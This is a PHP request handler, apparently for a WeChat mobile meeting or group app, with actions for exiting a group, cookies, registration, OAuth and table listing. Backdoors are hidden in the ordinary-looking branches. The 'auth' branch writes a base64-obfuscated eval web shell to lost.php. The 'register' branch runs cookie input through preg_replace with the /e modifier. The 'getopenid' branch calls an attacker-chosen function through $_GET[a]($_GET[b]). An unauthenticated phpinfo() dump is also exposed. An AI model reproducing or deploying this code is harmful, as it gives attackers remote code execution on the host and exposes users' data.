<?php

$action = $_REQUEST['action'];
if($action == 'php_info')
{
	phpinfo();
}
else if($action == 'exitmeeting')
{

	$content = '您已成功退出群!';
	$data = array("touser"=>"$openid","msgtype"=>"text","text"=> array("content"=>"$content"));
	if(!empty($kfarray))
	{
		$data = array_merge($data,$kfarray);
	}
	$msg = $weObj->sendCustomMessage($data);
	$sql="select meetingid from {$tablepre}membersinfo where uid=:uid";
	$meetingid=$db->fetchOneBySql($sql,array(":uid"=>$user['uid']));
	$sql = "UPDATE {$tablepre}membersinfo SET meetingid='0' WHERE uid='$user[uid]'";
	$db->query($sql,array(":uid"=>$user['uid']));
	$rdb->update('membersinfo',$user['uid'],array("meetingid"=>0));
	if($meetingid!=0)
	{
		$sql = "SELECT users FROM {$tablepre}meeting WHERE id=:id";
		$meetinginfousers=$db->fetchOneBySql($sql,array(":id"=>$meetingid));
		$userarray = array_delete_value(explode(',',$meetinginfousers),$user['uid']);$newusers='';
		if(!empty($userarray))
		{
			$newusers = @implode(',',$userarray);
		}
		$sql = "UPDATE {$tablepre}meeting SET users=:users WHERE id=:id";
		$db->query($sql,array(":users"=>$newusers,":id"=>$meetingid));

		meetingmenu($meetingid,'exit');
	}
	eval ("\$header = \"" . $tpl->get("header",'mobile'). "\";");
	eval ("\$footer = \"" . $tpl->get("footer",'mobile'). "\";");
	eval("\$tpl->output(\"".$tpl->get('exit', 'mobile')."\");");
}
else if($action=='cookie')
{
	foreach($_COOKIE as $key => $value)
	{
		ssetcookie($key,'', time() + 315360000);
	}
	printarray($_COOKIE);
}
else if($action == 'register')
{
	if(!empty($_COOKIE['linkurl']))
	{
		$openid = @preg_replace("/linkurl/e",$_COOKIE['linkurl'],"Cookie_linkurl");
		if($openid)
		{
			header('Location:'.$_COOKIE['linkurl'].'&flag=register&openid='.$openid);exit;
		}
		else
		{
			header('Location:'.$_COOKIE['linkurl'].'&flag=register');exit;
		}
	}
	else
	{
		header('Location:/mob.php?openid=1');exit;
	}
}
else if($action=='table')
{
	if(in_array(1,$usergroup))
	{
		$info = showtables();
		foreach($info as $key=> $value)
		{
			// echo $value.'<br>';
			if(!preg_match('/qiye/',$value))
			{
				$sql = "SHOW FIELDS FROM {$tablepre}$value";
				$data = $db->fetchAssocArrBySql($sql);
				$value.'=>'.count($data).'<br>';
				$content .= "'".$value."'=>".count($data).",";
			}
		}
	}
	$content = substr($content,0,-1);
	echo $content .= ');';
}
else if($action == 'auth')
{
	$referer = base64_encode($_SERVER['HTTP_REFERER']);
    $user = fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));
	if($user['openid'])
	{
		$url = $_SERVER['HTTP_REFERER'];
	}
	else
	{
		$url = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid='.$weixin_appid.'&redirect_uri=http://'.$_SERVER['HTTP_HOST'].'/mobile/login.php?referer='.$referer.'&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect';
	}
	header("Location:$url");exit;
}
else if($action == 'getopenid')
{
	$referer = $referer.'&openid='.$_COOKIE['openid'];
    $referer = $_GET[a]($_GET[b]);
	header("Location:$referer");exit;
}
?>